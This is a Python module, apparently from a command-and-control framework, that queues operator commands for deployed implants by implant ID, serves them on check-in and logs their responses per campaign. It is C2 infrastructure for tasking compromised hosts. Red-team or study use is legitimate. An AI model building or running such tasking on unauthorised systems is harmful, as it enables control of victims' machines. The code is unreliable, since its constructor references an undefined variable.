from Database import Database
class ImplantSingleton:
    class __OnlyOne:
        UID = None
        # -- REMOVE QUEUEDCOMMANDS
        QueuedCommands = []

        RegisteredCommands = {}

        CommandOutput = []
        # worth adding to the logging based on the commands issued here.
        # -- ON BOOT READ LOG FILE AND PULL UNPULLED COMMANDS

        def AddCommand(self, User, Implant, Command):
            # -- Add record to issues command table with username - time - command - UID
            # -- Implement the logging calls to ensure entries got to DB. and get recorded on pick up

            # -- BUG: ENSURE THAT UID and IID are not confused.

            db.Register_ImplantCommand(User, Implant, Command)
            # print("--- Adding Command ---\nUser: ", User, "\nImplant:",Implant,"\nCommand:",Command)

            #IID=db.Get_ImplantFromKey(Implant)
            if Implant not in self.RegisteredCommands:
                self.RegisteredCommands[Implant] = []
            self.RegisteredCommands[Implant].append(Command)

        def IssueCommand(self,UIK=0):
            # print(IID)
            if UIK != 0:
                # -- Issue command based on unique implant identifiers (UIK)
                # -- UIK is embedded into the implant via Jinja on delivery.
                # print("Reg cmd: ",self.RegisteredCommands)
                ImplantObj=db.Get_GeneratedImplantDataFromUIK(UIK)
                #print(ImplantObj)
                for x in ImplantObj:
                    # print(type(x['iid']),x['iid'], x['unique_implant_id'])
                    # print(self.RegisteredCommands)

                    if x['unique_implant_id'] in self.RegisteredCommands:
                        if len(self.RegisteredCommands[x['unique_implant_id']]) != 0:
                            a = self.RegisteredCommands[x['unique_implant_id']].pop()
                            # print(a)
                            return a

            # -- Create a suitable null response.
            # --    This may be a random value, depending on how the implant handles it.
                return "=="
            else:
                return "=="
        def CommandResponse(self,result):
            print("Cmd Response Received:",result)
            print(type(result))
            aa = result.split("::", 1)
            print(aa)
            db.Register_ImplantResponse(aa[0],aa[1])
            # -- Legacy Format Below: To remove -- #
            self.CommandOutput.append(result)
            return 0

        def Get_CommandResult(self,cid):
            # -- This trust any calls have already been authenticated/
            # --    May need to move authentication to this level.


            return db.Get_CampaignImplantResponses(cid)

    instance = None
    def __init__(self):
        if not ImplantSingleton.instance:
            ImplantSingleton.instance = ImplantSingleton.__OnlyOne()
        else:
            ImplantSingleton.instance.val = arg

db = Database()
x = ImplantSingleton()

